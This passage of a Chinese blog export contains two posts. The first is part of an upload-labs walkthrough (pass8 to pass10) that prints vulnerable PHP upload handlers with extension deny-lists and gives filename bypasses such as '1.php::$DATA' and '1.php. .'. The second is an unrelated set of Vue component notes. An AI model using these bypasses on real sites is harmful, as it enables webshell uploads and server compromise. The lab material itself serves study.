        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>这段代码少了这句话，可以与第六关相同的做法</p>
<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
<p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" alt></p>
<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细观察发现少了这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre>

<p> 采用Windows文件流特性绕过 </p>
<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
<p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" alt></p>
<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">

]]></content>
      <categories>
        <category>文件上传</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>MIME</tag>
        <tag>大小写绕过</tag>
        <tag>.htaccess</tag>
        <tag>windows文件特性</tag>
      </tags>
  </entry>
  <entry>
    <title>vue_component</title>
    <url>/2022/05/26/vue-component/</url>
    <content><![CDATA[<h1 id="Vue组件"><a href="#Vue组件" class="headerlink" title="Vue组件"></a>Vue组件</h1><p>做项目中使用到的vue组件，记录一下，以后使用到时直接复制即可</p>
<h2 id="Element-UI"><a href="#Element-UI" class="headerlink" title="Element UI"></a>Element UI</h2><h3 id="进入项目目录，安装依赖"><a href="#进入项目目录，安装依赖" class="headerlink" title="进入项目目录，安装依赖"></a>进入项目目录，安装依赖</h3><pre><code class="hljs sh">npm install element-ui -S</code></pre>

<p>安装成功后，查看配置文件<code>package.json</code>，是否有element-ui组件的版本号 如下图：</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526152216904.png" alt="image-20220526152216904"></p>
<h3 id="在main-js文件中-引入-element-组件"><a href="#在main-js文件中-引入-element-组件" class="headerlink" title="在main.js文件中 引入 element 组件"></a>在main.js文件中 引入 element 组件</h3><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> ElementUI <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;
Vue.use(ElementUI, &#123; <span class="hljs-keyword">size</span>: <span class="hljs-string">&quot;mini&quot;</span> &#125;);</code></pre>

<p>完成以上两个步骤，即可在项目中使用element-ui提供的组件了</p>
<h2 id="Echarts"><a href="#Echarts" class="headerlink" title="Echarts"></a>Echarts</h2><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> echarts -S</code></pre>

<p>如果不加版本号则默认安装最新版</p>
<pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install echarts@<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -S</code></pre>

<p>添加版本号，可以安装指定版本的依赖包，如图所示。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526152216904.png" alt="image-20220526152216904"></p>
<p>在vue文件中使用Echarts</p>
<h3 id="创建dom组件"><a href="#创建dom组件" class="headerlink" title="创建dom组件"></a>创建dom组件</h3><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pie&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 500px; height: 400px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>

<h3 id="初始化图表数据"><a href="#初始化图表数据" class="headerlink" title="初始化图表数据"></a>初始化图表数据</h3><pre><code class="hljs js"><span class="hljs-keyword">var</span> pieOption = &#123;
  title: &#123;
    text: <span class="hljs-string">&#x27;各季度会员数量统计&#x27;</span>,
    subtext: <span class="hljs-string">&#x27;比例图&#x27;</span>,
    left: <span class="hljs-string">&#x27;center&#x27;</span>
  &#125;,
  tooltip: &#123;
    trigger: <span class="hljs-string">&#x27;item&#x27;</span>
  &#125;,
  legend: &#123;
    orient: <span class="hljs-string">&#x27;vertical&#x27;</span>,
    left: <span class="hljs-string">&#x27;left&#x27;</span>
  &#125;,
  series: [
    &#123;
      type: <span class="hljs-string">&#x27;pie&#x27;</span>,
      radius: <span class="hljs-string">&#x27;60%&#x27;</span>,
      label:&#123;            <span class="hljs-comment">//饼图图形上的文本标签</span>
        normal:&#123;
          show:<span class="hljs-literal">true</span>,
          position:<span class="hljs-string">&#x27;inner&#x27;</span>, <span class="hljs-comment">//标签的位置</span>
          textStyle : &#123;
            fontWeight : <span class="hljs-number">300</span> ,
            fontSize : <span class="hljs-number">14</span>,    <span class="hljs-comment">//文字的字体大小</span>
            color: <span class="hljs-string">&quot;#fff&quot;</span>
          &#125;,
          formatter:<span class="hljs-string">&#x27;&#123;d&#125;%&#x27;</span>
        &#125;
      &#125;,
      data: [],  <span class="hljs-comment">// 填空</span>
      emphasis: &#123;
        itemStyle: &#123;
          shadowBlur: <span class="hljs-number">10</span>,
          shadowOffsetX: <span class="hljs-number">0</span>,
          shadowColor: <span class="hljs-string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span>
        &#125;
      &#125;
    &#125;
  ]
&#125;;

<span class="hljs-keyword">var</span> pieDom = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;pie&#x27;</span>);
<span class="hljs-keyword">var</span> pieChart = echarts.init(pieDom);</code></pre>

<p>其中<code>data: [],</code>是表格显示的数据，这里是需要重点实现的</p>
<p>这里可以在前端页面中写死数据，但是大多需要请求后端接口获取数据，如下</p>
<pre><code class="hljs js"><span class="hljs-built_in">this</span>.request.get(<span class="hljs-string">&quot;/echarts/members&quot;</span>).then(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span>&#123;
      pieOption.series[<span class="hljs-number">0</span>].data = [
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第一季度&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">0</span>]&#125;,
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第二季度&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">1</span>]&#125;,
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第三季度&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">2</span>]&#125;,
        &#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&quot;第四季度&quot;</span>, <span class="hljs-attr">value</span>: res.data[<span class="hljs-number">3</span>]&#125;,
      ]
    pieChart.setOption(pieOption);
&#125;</code></pre>

<p>实现效果图</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526155808268.png" alt="image-20220526155808268"></p>
<h2 id="Xterm"><a href="#Xterm" class="headerlink" title="Xterm"></a>Xterm</h2><p>毕业设计中实现了在网页中进入容器内容，也就是<code>docker exec -it containerId bash</code>功能</p>
<p>与webSHH功能类似</p>
<h3 id="安装依赖-1"><a href="#安装依赖-1" class="headerlink" title="安装依赖"></a>安装依赖</h3><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> xterm -S</code></pre>

<p>安装使用到的插件</p>
<pre><code class="hljs sh">npm install xterm-addon-attach -S
npm install xterm-addon-fit -S</code></pre>

<p>本文使用的版本如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220526160612795.png" alt="image-20220526160612795"></p>
<h3 id="在页面中导入使用到的包"><a href="#在页面中导入使用到的包" class="headerlink" title="在页面中导入使用到的包"></a>在页面中导入使用到的包</h3><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;xterm/css/xterm.css&quot;</span>;
<span class="hljs-keyword">import</span> &#123; Terminal &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm&quot;</span>;
<span class="hljs-keyword">import</span> &#123; FitAddon &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm-addon-fit&quot;</span>;
<span class="hljs-keyword">import</span> &#123; AttachAddon &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;xterm-addon-attach&quot;</span>;</code></pre>

<p>前端所有代码如下</p>
<pre><code class="hljs vue">&lt;template&gt;
  &lt;div class&#x3D;&quot;app-container&quot;&gt;
    &lt;el-row &gt;
      &lt;h1&gt;Web Console&lt;&#x2F;h1&gt;
        &lt;div id&#x3D;&quot;log&quot; style&#x3D;&quot;margin-top:20px;&quot;&gt;
          &lt;div class&#x3D;&quot;xterm&quot; id&#x3D;&quot;terminal&quot;&gt;&lt;&#x2F;div&gt;
        &lt;&#x2F;div&gt;
    &lt;&#x2F;el-row&gt;
  &lt;&#x2F;div&gt;
&lt;&#x2F;template&gt;
&lt;script&gt;
import &quot;xterm&#x2F;css&#x2F;xterm.css&quot;;
import &#123; Terminal &#125; from &quot;xterm&quot;;
import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;;
import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;;

export default &#123;
  components: &#123;&#125;,
  props: &#123;
    socketURI: &#123;
      type: String,
      default: &quot;&quot;
    &#125;
  &#125;,
  data() &#123;
    return &#123;
      term: null,
      socket: null,
      rows: 40,
      &#x2F;&#x2F; cols: 10,
      webSocketUrl: &#39;&#39;, &#x2F;&#x2F;&quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;5e0647ee611b&quot;,
      SetOut: false,
      isKey: false
    &#125;
  &#125;,
  computed: &#123;&#125;,
  watch: &#123;&#125;,
  created() &#123;
    const id &#x3D; this.$route.query.id
    console.log(id)
    this.webSocketUrl &#x3D; &quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;&quot; + id
  &#125;,
  mounted() &#123;
    this.initSocket();
  &#125;,
  beforeDestroy() &#123;
    this.socket.close();
    &#x2F;&#x2F; this.term.dispose();
  &#125;,
  methods: &#123;
    submitForm() &#123;
      this.$refs[&#39;elForm&#39;].validate(valid &#x3D;&gt; &#123;
        if (!valid) return
        &#x2F;&#x2F; TODO 提交表单
      &#125;)
    &#125;,
    resetForm() &#123;
      this.$refs[&#39;elForm&#39;].resetFields()
    &#125;,
    &#x2F;&#x2F;Xterm主题
    initTerm(data, callback) &#123;
      const term &#x3D; new Terminal(&#123;
        rendererType: &quot;canvas&quot;, &#x2F;&#x2F;渲染类型
        rows: this.rows, &#x2F;&#x2F;行数
        &#x2F;&#x2F; cols: this.cols,&#x2F;&#x2F; 设置之后会输入多行之后覆盖现象
        convertEol: true, &#x2F;&#x2F;启用时，光标将设置为下一行的开头
        &#x2F;&#x2F; scrollback: 10,&#x2F;&#x2F;终端中的回滚量
        fontSize: 14, &#x2F;&#x2F;字体大小
        disableStdin: false, &#x2F;&#x2F;是否应禁用输入。
        cursorStyle: &quot;block&quot;, &#x2F;&#x2F;光标样式
        cursorBlink: true, &#x2F;&#x2F;光标闪烁
        scrollback: 30,
        tabStopWidth: 8,
        theme: &#123;
          foreground: &quot;green&quot;, &#x2F;&#x2F;字体
          background: &quot;#000000&quot;, &#x2F;&#x2F;背景色
          cursor: &quot;help&quot; &#x2F;&#x2F;设置光标
        &#125;
      &#125;);
      const attachAddon &#x3D; new AttachAddon(this.socket);
      const fitAddon &#x3D; new FitAddon();
      term.loadAddon(attachAddon);
      term.loadAddon(fitAddon);
      term.open(document.getElementById(&quot;terminal&quot;));
      fitAddon.fit();
      term.focus();
      let _this &#x3D; this;
      &#x2F;&#x2F;限制和后端交互，只有输入回车键才显示结果
      term.prompt &#x3D; () &#x3D;&gt; &#123;
        term.write(&quot;\r\n$ &quot;);
      &#125;;
      term.prompt();

      function runFakeTerminal(_this) &#123;
        if (term._initialized) &#123;
          return;
        &#125;
        &#x2F;&#x2F; 初始化
        term._initialized &#x3D; true;
        term.writeln();&#x2F;&#x2F;控制台初始化报错处
        term.prompt();
        &#x2F;&#x2F; &#x2F; **
        &#x2F;&#x2F;     *添加事件监听器，用于按下键时的事件。事件值包含
        &#x2F;&#x2F;     *将在data事件以及DOM事件中发送的字符串
        &#x2F;&#x2F;     *触发了它。
        &#x2F;&#x2F;     * @返回一个IDisposable停止监听。
        &#x2F;&#x2F;  * &#x2F;
        &#x2F;&#x2F;   &#x2F; ** 更新：xterm 4.x（新增）
        &#x2F;&#x2F;  *为数据事件触发时添加事件侦听器。发生这种情况
        &#x2F;&#x2F;  *用户输入或粘贴到终端时的示例。事件值
        &#x2F;&#x2F;  *是&#96;string&#96;结果的结果，在典型的设置中，应该通过
        &#x2F;&#x2F;  *到支持pty。
        &#x2F;&#x2F;  * @返回一个IDisposable停止监听。
        &#x2F;&#x2F;  * &#x2F;
        &#x2F;&#x2F; 支持输入与粘贴方法
        term.onData(function(key) &#123;
          let order &#x3D; &#123;
            Data: key,
            Op: &quot;stdin&quot;
          &#125;;
          _this.onSend(order);
        &#125;);
        _this.term &#x3D; term;
      &#125;

      runFakeTerminal(_this);
    &#125;,
    &#x2F;&#x2F;webShell主题
    initSocket() &#123;
      const WebSocketUrl &#x3D; this.webSocketUrl
      this.socket &#x3D; new WebSocket(
        WebSocketUrl
      );
      this.socketOnClose(); &#x2F;&#x2F;关闭
      this.socketOnOpen(); &#x2F;&#x2F;
      this.socketOnError();
    &#125;,
    &#x2F;&#x2F;webshell链接成功之后操作
    socketOnOpen() &#123;
      this.socket.onopen &#x3D; () &#x3D;&gt; &#123;
        &#x2F;&#x2F; 链接成功后
        this.initTerm();
      &#125;;
    &#125;,
    &#x2F;&#x2F;webshell关闭之后操作
    socketOnClose() &#123;
      this.socket.onclose &#x3D; () &#x3D;&gt; &#123;
        console.log(&quot;close socket&quot;);
      &#125;;
    &#125;,
    &#x2F;&#x2F;webshell错误信息
    socketOnError() &#123;
      this.socket.onerror &#x3D; () &#x3D;&gt; &#123;
        console.log(&quot;socket 链接失败&quot;);
      &#125;;
    &#125;,
    &#x2F;&#x2F;特殊处理
    onSend(data) &#123;
      data &#x3D; this.base.isObject(data) ? JSON.stringify(data) : data;
      data &#x3D; this.base.isArray(data) ? data.toString() : data;
      data &#x3D; data.replace(&#x2F;\\\\&#x2F;, &quot;\\&quot;);
      this.shellWs.onSend(data);
    &#125;,
    &#x2F;&#x2F;删除左右两端的空格
    trim(str) &#123;
      return str.replace(&#x2F;(^\s*)|(\s*$)&#x2F;g, &quot;&quot;);
    &#125;
  &#125;
&#125;
&lt;&#x2F;script&gt;
&lt;style&gt;
&lt;&#x2F;style&gt;</code></pre>

<p>以前前端代码基本不需要改动，只需要修改后端的api</p>
<pre><code class="hljs ini"><span class="hljs-attr">this.webSocketUrl</span> = <span class="hljs-string">&quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot;</span> + id</code></pre>

<p>将该参数修改为后端websocket接口即可使用</p>
<h2 id="vue-video-player"><a href="#vue-video-player" class="headerlink" title="vue-video-player"></a>vue-video-player</h2><h3 id="安装依赖-2"><a href="#安装依赖-2" class="headerlink" title="安装依赖"></a>安装依赖</h3><pre><code class="hljs sh">npm install vue-video-player@5.0.2 -S</code></pre>

<h3 id="在单文件中使用"><a href="#在单文件中使用" class="headerlink" title="在单文件中使用"></a>在单文件中使用</h3><p>首先导入依赖</p>
<pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; videoPlayer &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-video-player/src&#x27;</span>  
<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;video.js/dist/video-js.css&#x27;</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;vue-video-player/src/custom-theme.css&#x27;</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;
  name: <span class="hljs-string">&quot;VideoDetail&quot;</span>,
  components: &#123;
    videoPlayer
  &#125;,</code></pre>

<p>之前是<code>import &#123; videoPlayer &#125; from &#39;vue-video-player&#39;</code> ，报错信息如下</p>
<pre><code class="hljs subunit"> error  in ./node_modules/vue-video-player/dist/vue-video-player.js

Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\Sunzh\java\admin_demo\hello-world\node_modules\vue-video-player\dist&#x27;

<span class="hljs-keyword">ERROR </span>in ./node_modules/vue-video-player/dist/vue-video-player.js
Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\Sunzh\java\admin_demo\hello-world\node_modules\vue-video-player\dist&#x27;
 @ ./node_modules/babel-loader/lib/index.js??clonedRuleSet<span class="hljs-string">-40</span>[0].rules[0].use[0]!./node_modules/@vue/vue-loader-v15/lib/index.js??vue-loader-options!./src/views/Detail.vue?vue&amp;type=scr
